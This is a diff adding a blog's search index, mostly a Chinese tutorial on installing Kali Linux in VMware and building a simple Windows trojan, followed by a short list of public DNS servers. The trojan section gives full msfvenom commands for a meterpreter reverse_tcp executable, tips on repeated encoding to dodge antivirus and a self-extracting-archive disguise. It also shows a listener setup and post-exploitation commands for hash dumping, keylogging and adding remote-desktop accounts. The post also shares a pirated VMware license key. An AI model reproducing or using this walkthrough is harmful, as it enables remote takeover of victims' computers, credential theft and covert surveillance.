@@ -1,0 +1,1996 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  
+  
+    
+    <entry>
+      <title><![CDATA[kali-linux 几行指令制作最简单的木马]]></title>
+      <url>http://yikunhaocong.xyz/2017/03/25/kali-linux/</url>
+      <content type="html"><![CDATA[<pre><code>记录安装和配置Kali-linux，并使Msfvenom库生成木马和入侵win的过程。
+</code></pre><h2 id="开始安装和配置Kali-Linux"><a href="#开始安装和配置Kali-Linux" class="headerlink" title="开始安装和配置Kali-Linux"></a>开始安装和配置Kali-Linux</h2><h3 id="1-虚拟机VMware下载与安装"><a href="#1-虚拟机VMware下载与安装" class="headerlink" title="(1)虚拟机VMware下载与安装"></a>(1)虚拟机VMware下载与安装</h3><p>VMware 12 Pro 12.1 发行说明<br><a href="http://pubs.vmware.com/Release_Notes/cn/workstation/12pro/workstation-121-release-notes.html" target="_blank" rel="external">http://pubs.vmware.com/Release_Notes/cn/workstation/12pro/workstation-121-release-notes.html</a><br>VMware 12 官方功能特性介绍：<br><a href="http://vmware.com/cn/products/workstation" target="_blank" rel="external">http://vmware.com/cn/products/workstation</a><br>VMware 12 专业版永久许可证密钥<br>5A02H-AU243-TZJ49-GTC7K-3C61N<br>VMware Workstation 12 官方简体中文专业版 + 注册机<br>VMware v11.x / v10.x  官方简体中文版经典版 + 注册机<br>v12.1.1 Build 3770994  官方本地下载  大小，293.67M<br><a href="http://pan.baidu.com/s/1cdWqF8" target="_blank" rel="external">http://pan.baidu.com/s/1cdWqF8</a>  访问密码: 28b4<br>注：新版不支持32位系统，系统是32位的请用VM10</p>
+<h3 id="2-Kali-liunx-镜像下载与安装"><a href="#2-Kali-liunx-镜像下载与安装" class="headerlink" title="(2)Kali-liunx 镜像下载与安装"></a>(2)Kali-liunx 镜像下载与安装</h3><p>第一类，是最常规的32和64位版本：<br>kali-linux-2016.2-amd64.iso<br>kali-linux-2016.2-i386.iso<br>第二类是简化版：<br>kali-linux-light-2016.2-amd64.iso<br>kali-linux-light-2016.2-armel.img.xz<br>kali-linux-light-2016.2-armhf.img.xz<br>kali-linux-light-2016.2-i386.iso<br>第三类，是新增的四种桌面版，如e17、lxde、mate和xfce。<br>kali-linux-e17-2016.2-amd64.iso<br>kali-linux-lxde-2016.2-amd64.iso<br>kali-linux-mate-2016.2-amd64.iso<br>kali-linux-xfce-2016.2-amd64.iso<br><img src="http://img.blog.csdn.net/20170325161736981?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="Gnome桌面"><br><img src="http://img.blog.csdn.net/20170325161801806?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="Xfce桌面"></p>
+<blockquote>
+<p>此处提供所有版本iso的下载网盘链接<br> 链接：<a href="http://pan.baidu.com/s/1o79xFyM" target="_blank" rel="external">http://pan.baidu.com/s/1o79xFyM</a> 密码：bm73<br> 我安装的是kali-linux-light-2016.2-amd64版本</p>
+</blockquote>
+<h3 id="VMware安装之后（下面是VM10-0的教程与最新版本差不多）"><a href="#VMware安装之后（下面是VM10-0的教程与最新版本差不多）" class="headerlink" title="VMware安装之后（下面是VM10.0的教程与最新版本差不多）"></a>VMware安装之后（下面是VM10.0的教程与最新版本差不多）</h3><p>3）启动VMware Workstation，将显示如图所示的界面。</p>
+<p><img src="http://img.blog.csdn.net/20170325203916495?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="VMware Workstation启动界面"></p>
+<p>（4）从该界面可以看到，有六个图标可以点击。这里单击“创建新的虚拟机”图标，将显示如图所示的界面。</p>
+<p>（5）从该界面可以看到，显示了两种安装类型，分别是“典型”和“自定义”。如果使用“自定义”类型安装的话，用户还需要手动设置其它配置。这里推荐使用“典型”的类型，然后单击“下一步”按钮，将显示如图所示的界面。</p>
+<p><img src="http://img.blog.csdn.net/20170325203945214?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="新建虚拟机向导&amp;安装客户机操作系统">                 </p>
+<p>（6）该界面选择安装客户机操作系统的方式。从该界面可以看到，提供了三种方法。这里选择使用“稍后安装操作系统（S）”选项，然后单击“下一步”按钮，将显示如图所示的界面。</p>
+<p>（7）在该界面选择安装的操作系统和版本。这里选择Linux操作系统，版本为“其它Linux 3.X内核64位”，然后单击“下一步”按钮，将显示如图所示的界面。</p>
+<p><img src="http://img.blog.csdn.net/20170325204001341?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="选择客户机操作系统&amp;命名虚拟机">                   </p>
+<p>（8）在该界面为虚拟机创建一个名称，并设置虚拟机的安装位置。设置完成后，单击“下一步”按钮，将显示如图所示的界面。</p>
+<p>（9）在该界面设置磁盘的容量。如果当前主机有足够大的磁盘时，建议设置的磁盘容量大点，避免造成磁盘容量不足。这里设置为80GB(PS:建议设置为20-40G之间的值)，然后单击“下一步”按钮，将显示如图所示的界面。</p>
+<p><img src="http://static.oschina.net/uploads/space/2015/0324/155309_hhkz_1585857.png" alt="指定磁盘容量&amp;已准备好创建虚拟机"></p>
+<p>（10）该界面显示了所创建虚拟机的详细信息，此时就可以创建操作系统了。然后单击“完成”按钮，将显示如图所示的界面。</p>
+<p><img src="http://static.oschina.net/uploads/space/2015/0324/155310_ejOb_1585857.png" alt="创建虚拟机"></p>
+<p>（11）该界面显示了新创建的虚拟机的详细信息。接下来就可以准备安装Kali Linux1.0.5操作系统了。但是，在安装Kali Linux之前需要设置一些信息。在VMware Workstation窗口中单击“编辑虚拟机设置”，将显示如图所示的界面。</p>
+<p><img src="http://static.oschina.net/uploads/space/2015/0324/155310_H384_1585857.png" alt="虚拟机设置"></p>
+<p>（12）在该界面可以设置内存、处理器、网络适配器等。将这些硬件配置好后，选择“CD/DVD（IDE）”选项，将显示如图所示的界面。</p>
+<p><img src="http://static.oschina.net/uploads/space/2015/0324/155310_0cj5_1585857.png" alt="选择ISO映像文件"></p>
+<p>（13）在该界面的右侧选择“使用ISO映像文件”复选框，并单击“浏览”按钮，选择Kali Linux1.0.5的映像文件。然后单击“确定”按钮，将返回到图所示的界面。此时，就可以开始安装Kali Linux操作系统。</p>
+<p>（14）在图中单击“开启此虚拟机”命令，将显示一个新的窗口，如图所示。</p>
+<p><img src="http://static.oschina.net/uploads/space/2015/0324/155310_ePcN_1585857.png" alt="安装界面"></p>
+<p>（15）此时，就可以在VMware Workstation上安装Kali Linux操作系统了本文选自Kali Linux无线网络渗透测试教程。</p>
+<h3 id="运行Kali-Linux虚拟机并在系统内安装的教程"><a href="#运行Kali-Linux虚拟机并在系统内安装的教程" class="headerlink" title="运行Kali Linux虚拟机并在系统内安装的教程"></a>运行Kali Linux虚拟机并在系统内安装的教程</h3><blockquote>
+<p>此处可见官方教程（硬盘安装Kali Linux）<br>当然我们是加载iso镜像文件 实质上相当于插入了一个硬盘<br>-<a href="http://cn.docs.kali.org/installing-kali-linux-cn/%E7%A1%AC%E7%9B%98%E5%AE%89%E8%A3%85kali-linux" target="_blank" rel="external">具体操作请见官方安装Kali-linux的文档</a></p>
+</blockquote>
+<h3 id="Kali-linux系统装完后启动，进行进一步配置"><a href="#Kali-linux系统装完后启动，进行进一步配置" class="headerlink" title="Kali-linux系统装完后启动，进行进一步配置"></a>Kali-linux系统装完后启动，进行进一步配置</h3><ul>
+<li>解决中文显示乱码问题：<br>第一步: 打开系统的命令行 键入<br><code>apt-get install ttf-wqy-*</code><br>安装好之前缺失的中文语言包,再输入<br><code># echo LANG=&quot;zh_CN.UTF-8&quot; &gt; /etc/default/locale</code>,回车执行，再执行<code>reboot</code>重启即可。<blockquote>
+<p>若中文乱码问题还未完全解决，进行下一步尝试:<br>  <code>dpkg-reconfigure locales</code><br>  选择字符编码：en_US.UTF-8、zh_CN.GBK、zh_CN.UTF-8<br>  选择字符：zh_CN.UTF-8（记得用空格）<br>  设置完后重启<code>reboot</code><br>更新软件源，借用国内镜像使下载速度更快：<br>直接打开<code>/etc/apt/sources.list</code>或者先<br><code>apt-get install leafpad</code>下载安装编辑器leafpad<br>然后在sources.list文件里添加下面的东西：<br><code>deb http://http.kali.org/kali kali main non-free contrib
+  deb-src http://http.kali.org/kali kali main non-free contrib
+  deb http://security.kali.org/kali-security kali/updates main contrib non-free
+  deb http://ftp.sjtu.edu.cn/debian wheezy main non-free contrib 
+  deb-src http://ftp.sjtu.edu.cn/debian wheezy main non-free contrib 
+  deb http://ftp.sjtu.edu.cn/debian wheezy-proposed-updates main non-free contrib 
+  deb-src http://ftp.sjtu.edu.cn/debian wheezy-proposed-updates main non-free contrib 
+  deb http://ftp.sjtu.edu.cn/debian-security wheezy/updates main non-free contrib 
+  deb-src http://ftp.sjtu.edu.cn/debian-security wheezy/updates main non-free contrib 
+  deb http://mirrors.163.com/debian wheezy main non-free contrib 
+  deb-src http://mirrors.163.com/debian wheezy main non-free contrib 
+  deb http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib 
+  deb-src http://mirrors.163.com/debian wheezy-proposed-updates main non-free contrib 
+  deb-src http://mirrors.163.com/debian-security wheezy/updates main non-free contrib 
+  deb http://mirrors.163.com/debian-security wheezy/updates main non-free contrib</code><br>  再执行<code>apt-get update</code>更新软件源</p>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<p> 下面这些仅供参考，都是很有用的工具,可以下载一下:<br>   安装中文字体和五笔拼音输入法：<br>    <code>apt-get install fcitx-table-wbpy ttf-wqy-microhei ttf-wqy-zenhei</code><br>    重新登录后使用im-config启用fcitx<br>    运行Fcitx Configuration，在Input Method中添加输入法。<br>    安装Flash插件：<br>    <code>apt-get install flashplugin-nonfree</code><br>    <code>update-flashplugin-nonfree --install</code><br>    安装原版Firefox方法：<br>    2013年7月16日，iceweasel终于更新到22.0了。<br>    Firefox已经更新到20，我很喜欢它的新下载管理器，可惜iceweasel版本还是停留在18.01，so。。。<br>    <code>apt-get remove iceweasel</code><br>    <code>echo -e &quot;\ndeb http://downloads.sourceforge.net/project/ubuntuzilla/mozilla/apt all main&quot; | sudo tee -a /etc/apt/sources.list &gt; /dev/null
+    apt-key adv --recv-keys --keyserver keyserver.ubuntu.com C1289A29
+    apt-get update
+    apt-get firefox-mozilla-build</code><br>    安装几个我常用的小工具：<br>    <code>apt-get install i nethogs aria2</code><br>    安装”Open In Terminal”的快捷方式<br>    <code>apt-get install nautilus-open-terminal</code><br>    安装远程桌面管理工具：<br>    <code>apt-get install gtk-recordmydes recordmydes remmina</code><br>    Deb包图形安装工具：<br>    <code>apt-get install gdebi</code><br>    压缩文件管理工具及解压缩工具：<br>    <code>apt-get install unrar unace rar unrar p7zip zip unzip p7zip-full p7zip-rar file-roller</code><br>    Gnome3优化设置工具：<br>    <code>apt-get install gnome-tweak-tool</code><br>    新立得，用过老版ubuntu的都知道：<br>    <code>apt-get install synaptic</code><br>    Shadowsocks的Linux客户端：<br>    <code>apt-get install python-twisted-core python-gtk2 python-m2crypto
+    pip install shadowsocks-gtk</code><br>    安装Ubuntu软件中心Software Center：<br>    <code>apt-get install software-center</code><br>    安装wicd，它可是比系统自带的network-manager好用多了：<br>    <code>apt-get install wicd</code><br>    <code>#/etc/init.d/network-manager</code><br>    停用network-manager<br>    <code>update-rc.d network-manager disable</code>    //禁止network-manager开机启动<br>    wicd-client                                                 //启动wicd<br>    Netspeed，可以显示当前网络上传下载速度的GNOME applet：<br>    <code>apt-get install netspeed</code><br>    Alt+鼠标右键选择Add to Panel<br>    Python类工具需要：<br>    <code>apt-get install python-dev python-greenlet python-gevent python-vte python-openssl python-crypto python-appindicator libnss3-tools</code><br>    安装pip，方便升级gevent1.0：<br>    <code>apt-get install python-setuptools</code><br>    <code>easy_install pip</code><br>    <code>pip install setuptools --no-use-wheel --upgrade</code>  //提示setuptools版本错误时执行<br>    <code>pip install gevent --upgrade</code><br>    Armitage是metasploit的图形界面，适合新手搞研究：<br>    <code>apt-get install armitage</code><br>    Postgresql和metasploit开机时自动启动：<br>    <code>update-rc.d postgresql enable &amp;&amp; update-rc.d metasploit enable</code><br>    fern-wifi-cracker更新后无法启动，解决方法是：<br>    <code>chmod +x /usr/share/fern-wifi-cracker/execute.py</code><br>    在使用minidwep-gtk类软件搞研究前，要先停用network-manager，不停用的话扫不到几个信号，虚拟机或有网线连接的用户应该没有这个烦恼：<br>    <code>#/etc/init.d/network-manager</code><br>    解决音量设置无法保存：<br>    `</p>
+<pre><code>#apt-get install alsa-utils
+#alsactl store
+`
+目前发现Linux平台非常好用的视频播放器：
+基于mplayer/mplayer2的mpv，就算是没有标准的gui界面：
+`apt-get install mpv`
+</code></pre></blockquote>
+<h2 id="Kali-linux配置完成后，开始用自带的msfvenom库构建攻击负荷"><a href="#Kali-linux配置完成后，开始用自带的msfvenom库构建攻击负荷" class="headerlink" title="Kali-linux配置完成后，开始用自带的msfvenom库构建攻击负荷"></a>Kali-linux配置完成后，开始用自带的msfvenom库构建攻击负荷</h2><blockquote>
+<p>说简单点，就是我们要开始来制作木马了</p>
+<h3 id="先简单看一下我们要用到的msfvenom库吧"><a href="#先简单看一下我们要用到的msfvenom库吧" class="headerlink" title="先简单看一下我们要用到的msfvenom库吧"></a>先简单看一下我们要用到的msfvenom库吧</h3><p>  2015年6月8日，Wei Chen在rapid7官方博客上发文，将于近期移除metasploit-framework版本中的msfencoder和msfpayload，并使用msfvenom取代。官方的msfvenom使用说明戳这里，下面给出翻译的使用说明。<br>  <img src="http://www.2cto.com/uploadfile/Collfiles/20150714/20150714102041606.png" alt=""></p>
+<h3 id="msfvenom使用简介"><a href="#msfvenom使用简介" class="headerlink" title="msfvenom使用简介"></a>msfvenom使用简介</h3><pre><code>最近一次更新的msf中已经去掉了这两个工具，同时，msfcli也即将被移除。
+</code></pre><p><img src="http://www.2cto.com/uploadfile/Collfiles/20150714/20150714102041611.png" alt=""><br>    msfvenom使用简介<br>    kali和BT目前使用的MSF依然是旧版，所以用kali和BT5的小伙伴可以暂时不考虑。在其他平台上编译安装msf的童鞋，可能已经发现这个东西了。<br><img src="http://www.2cto.com/uploadfile/Collfiles/20150714/20150714102041612.png" alt=""><br>    msfvenom使用简介<br>    msfvenom命令行选项如下：<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">-p, --payload    payload&gt;       指定需要使用的payload(攻击荷载)。如果需要使用自定义的payload，请使用&apos;-&apos;或者stdin指定</div><div class="line">-l, --list       [module_type]   列出指定模块的所有可用资源. 模块类型包括: payloads, encoders, nops, all</div><div class="line">-n, --nopsled    length&gt;        为payload预先指定一个NOP滑动长度</div><div class="line">-f, --format     format&gt;        指定输出格式 (使用 --help-formats 来获取msf支持的输出格式列表)</div><div class="line">-e, --encoder    [encoder]       指定需要使用的encoder（编码器）</div><div class="line">-a, --arch       architecture&gt;  指定payload的目标架构</div><div class="line">    --platform   platform&gt;      指定payload的目标平台</div><div class="line">-s, --space      length&gt;        设定有效攻击荷载的最大长度</div><div class="line">-b, --bad-chars  list&gt;          设定规避字符集，比如: &apos;\x00\xff&apos;</div><div class="line">-i, --iterations count&gt;         指定payload的编码次数</div><div class="line">-c, --add-code   path&gt;          指定一个附加的win32 shellcode文件</div><div class="line">-x, --template   path&gt;          指定一个自定义的可执行文件作为模板</div><div class="line">-k, --keep                       保护模板程序的动作，注入的payload作为一个新的进程运行</div><div class="line">    --payload-options            列举payload的标准选项</div><div class="line">-o, --out   path&gt;               保存payload</div><div class="line">-v, --var-name name&gt;            指定一个自定义的变量，以确定输出格式</div><div class="line">    --shellest                   最小化生成payload</div><div class="line">-h, --help                       查看帮助选项</div><div class="line">    --help-formats</div></pre></td></tr></table></figure></p>
+<p> 查看msf支持的输出格式列表<br>    生成payload<br>    生成payload，有有两个必须的选项：-p -f<br>    使用-p 来指定要使用的payload。<br>    可以使用下面的命令来查看所有msf可用的payload列表<br>    <code>./msfvenom -l payloads</code><br>    -p选项也支持使用使用自定义的payload，需要使用 “-“，比如:<br>    <code>cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw</code><br>    使用-f 来指定payload的输出格式<br>    举例：<br>    <code>./msfvenom -p windows/meterpreter/bind_tcp -f exe</code><br>    使用下面的命令，可以产看msf支持的输出格式<br>    <code>./msfvenom --help-formats</code><br>    一个典型的msfvenom使用举例如下：<br>    <code>$ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker&#39;s IP] lport=4444 -f exe -o /tmp/my_payload.exe</code><br>    对payload进行编码<br>    如果你使用了-b选项（设定了规避字符集），会自动调用编码器。<br>    其他情况下，你需要使用-e选项来使用编码模块，例如：<br>    <code>./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw</code><br>    可以使用下面的命令，来查看可用的编码器<br>    <code>./msfvenom -l encoders</code><br><strong>你也可以使用-i选项进行多次编码。某些情况下，迭代编码可以起到规避杀毒软件的作用，但你需要知道，编码并没有使用一个真正意义上的AV规避方案。</strong><br>可以使用下面的命令来进行迭代编码：<br>    <code>./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -i 3</code><br>    规避字符<br>    使用-b选项意味着在生成payload的时候对某些字符进行规避。当你使用这个选项的时候，msfvenom会自动的使用合适的编码器对payload进行编码，比如：<br>    <code>./msfvenom -p windows/meterpreter/bind_tcp -b &#39;\x00&#39; -f raw</code><br>    使用自定义可执行文件模板<br>    默认的，msfvenom使用的模板文件保存在msf/data/templates目录中，如果你想使用你自己的模板文件，你可以使用-x选项来指定，比如：<br>    <code>./msfvenom -p windows/meterpreter/bind_tcp -x calc.exe -f exe &gt; new.exe</code><br>    这个命令将使用windows下计算器程序（calc.exe）作为可执行文件的模板生成payload。<br>    注意：如果你想要创建一个windows的x64的可执行文件模板来生成一个x64的payload，你只能使用exe格式的模板。<br>    使用-x选项经常和-k选项配合使用，-k选项会将你的payload作为一个新的进程运行。但目前这个选项只支持老版本的windows系统比如windows xp</p>
+</blockquote>
+<p><strong>Windows7(经测试，也适用于win8,win10) kali Linux工具    metasploit</strong></p>
+<h3 id="在虚拟机运行kalilinux以及Windows7然后开始监听目标主机"><a href="#在虚拟机运行kalilinux以及Windows7然后开始监听目标主机" class="headerlink" title="在虚拟机运行kalilinux以及Windows7然后开始监听目标主机"></a>在虚拟机运行kalilinux以及Windows7然后开始监听目标主机</h3><blockquote>
+<p> 终端输入<br>    <code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.7 LPORT=8080 -f exe &gt;/var/www/html/b.exe chmod -R 777 /var/www/html/</code><br>    打开metasploit<br>    msfconsole<br>    加载利用模块监听目标主机ip 192.168.1.7，端口8080执行<br>    <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">use exploit/multi/handler</div><div class="line">set PAYLOADS windows/meterpreter/reverse_tcp</div><div class="line">set LHOST 192.168.1.7</div><div class="line">set LPORT 8080</div><div class="line">exploit`</div><div class="line">`sessions -i 1 //打开建立的第一个会话</div><div class="line">getuid //查看UID</div><div class="line">sysinfo //查看攻击主机的系统信息</div><div class="line">run hashdump //dump目标主机的hash帐号信息，备份进行暴破</div><div class="line">ps //查看目标主机进程</div><div class="line">migrate 1576(pid) //切换自己为管理员，1576是管理员的进程ID</div><div class="line">getuid</div><div class="line">keyscan_start //开启健盘记录功能</div><div class="line">keyscan_dump //查看健盘记录信息</div><div class="line">keyscan_stop //停止健盘记录</div><div class="line">run getgui -e //远程开启目标主机的远程桌面</div><div class="line">run getgui -u cisco -p cisco //远程添加目标主机帐号密码</div><div class="line">rdesktop 192.168.1.100 //远程桌面</div></pre></td></tr></table></figure></p>
+<p>   现在到Windows7(win8,win10)创建自解压文件<br>    进入高级选项<br>    在文字提示窗口输入恶意代码如下<br>    然后一直确定就会出现一个文件名称中带有sfx的可执行文件，双击执行之后kali Linux中一直监听目标机器的程序就会出现你目标主机的配置信息。</p>
+</blockquote>
+<h3 id="看了上面的教程，如果还觉得实战有问题的话，那就直接看-我的图片教程咯-从头开始创建一个小木马"><a href="#看了上面的教程，如果还觉得实战有问题的话，那就直接看-我的图片教程咯-从头开始创建一个小木马" class="headerlink" title="看了上面的教程，如果还觉得实战有问题的话，那就直接看    我的图片教程咯(从头开始创建一个小木马)"></a>看了上面的教程，如果还觉得实战有问题的话，那就直接看    我的图片教程咯(从头开始创建一个小木马)</h3><p><img src="http://img.blog.csdn.net/20170325192729117?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="先用ifconfig指令确定本机的IP 此处为 192.168.111.135"><br><img src="http://img.blog.csdn.net/20170325192831399?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="再用msfvenom指令生成木马"><br><strong>上面 -p用来指定payloads种类 一般攻击windows的用windows/meterpreter/reverse_tcp 然后LHOST设置IP LPORT设置端口(可以随意) 最后设置输出格式-f 为exe 保存为桌面的evil.exe</strong><br><img src="http://img.blog.csdn.net/20170325193034199?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="生成完毕,由于无指定platform 自动设置为windows CPU架构默认设置为x86 默认不使用编码器"><br><img src="http://img.blog.csdn.net/20170325193205603?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="可以看到这个exe就是我们生成的木马"><br><img src="http://img.blog.csdn.net/20170325193239682?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="启动监视窗口msfconsole"><br><img src="http://img.blog.csdn.net/20170325193317104?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="看到酷酷的图案以及出现msf&gt; 说明启动成功"><br><img src="http://img.blog.csdn.net/20170325193358604?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="设置监听的IP地址和端口(我们之前定义在木马上的)"><br><img src="http://img.blog.csdn.net/20170325193442933?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="输入exploit开始监听"></p>
+<h3 id="启动的木马-实现控制"><a href="#启动的木马-实现控制" class="headerlink" title="启动的木马 实现控制"></a>启动的木马 实现控制</h3><blockquote>
+<p>由于我的VMware安装TOOLs出现了意外，所以无法直接把木马文 件拖到windows上，因此自己用python写了个基于ssh协议的传输程序，可以很快地实现linux和windows的文件传输以及命令台控制(获取kali-linux的权限)<br><img src="http://img.blog.csdn.net/20170325193919822?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="然后用这个把木马传了过来"><br><img src="http://img.blog.csdn.net/20170325194041967?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="可以看到，evil.exe木马传过来了"><br><img src="http://img.blog.csdn.net/20170325194146937?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="运行后发现被360查杀,由于我们是做渗透测试，直接添加信任"><br><img src="http://img.blog.csdn.net/20170325194929539?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="可以看到运行后,kali-linux已经接收到信号了,出现meterpreter,说明可以远程控制了"><br><img src="http://img.blog.csdn.net/20170325195017149?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="可以看到各种控制指令"><br><img src="http://img.blog.csdn.net/20170325195048071?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="包括键盘记录，屏幕截图，远程视频等"><br><img src="http://img.blog.csdn.net/20170325195144651?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="获取对方电脑的进程，实现控制、停止和监听"><br><img src="http://img.blog.csdn.net/20170325195219582?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="arp攻击等"><br><img src="http://img.blog.csdn.net/20170325195259614?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="各种文件操作，包括下载和上传到被攻击的电脑，实现任意修改"><br><img src="http://img.blog.csdn.net/20170325195349099?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvQ1NETjU2ODMwMjIwMw==/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center" alt="获取对方的系统信息等"></p>
+<h3 id="自己好好去实践玩一下吧"><a href="#自己好好去实践玩一下吧" class="headerlink" title="自己好好去实践玩一下吧"></a>自己好好去实践玩一下吧</h3></blockquote>
+]]></content>
+      
+        <categories>
+            
+            <category> 渗透笔记 </category>
+            
+            <category> 后台游戏 </category>
+            
+            <category> 作者:Hac </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> Kali-linux </tag>
+            
+            <tag> Payloads </tag>
+            
+            <tag> Msfvenom </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[几个国内专用的公共 DNS]]></title>
+      <url>http://yikunhaocong.xyz/2016/05/11/public-dns/</url>
+      <content type="html"><![CDATA[<p>　　之前 <a href="http://www.bootcdn.cn/" target="_blank" rel="external">有个网站</a> 自己经常上不去，查了挺久才发现是 DNS 的问题，更换为公共 DNS 后访问恢复正常。由此可见，挑选一个合适自己网络的 DNS 还是挺有必要的。</p>
+<a id="more"></a>
+<h2 id="DNS-简介"><a href="#DNS-简介" class="headerlink" title="DNS 简介"></a>DNS 简介</h2><p>DNS 全称 <code>Domain Name System</code>，中文译为 <code>域名系统</code>，是因特网的一项服务，其域名服务器的分布式数据库中存储着因特网上域名和 IP 地址相互映射的关系，经解析器解析，使用户能够通过域名来访问互联网。</p>
+<h2 id="114DNS"><a href="#114DNS" class="headerlink" title="114DNS"></a>114DNS</h2><pre><code>114.114.114.114
+114.114.115.115
+</code></pre><p><strong>官　网</strong>：<a href="http://www.114dns.com/" target="_blank" rel="external">http://www.114dns.com/</a><br><strong>关键词</strong>：权威，高速，稳定，可靠，无劫持，防钓鱼，防病毒</p>
+<h2 id="阿里公共DNS"><a href="#阿里公共DNS" class="headerlink" title="阿里公共DNS"></a>阿里公共DNS</h2><pre><code>223.5.5.5
+223.6.6.6
+</code></pre><p><strong>官　网</strong>：<a href="http://www.alidns.com/" target="_blank" rel="external">http://www.alidns.com/</a><br><strong>关键词</strong>：快速，稳定，智能</p>
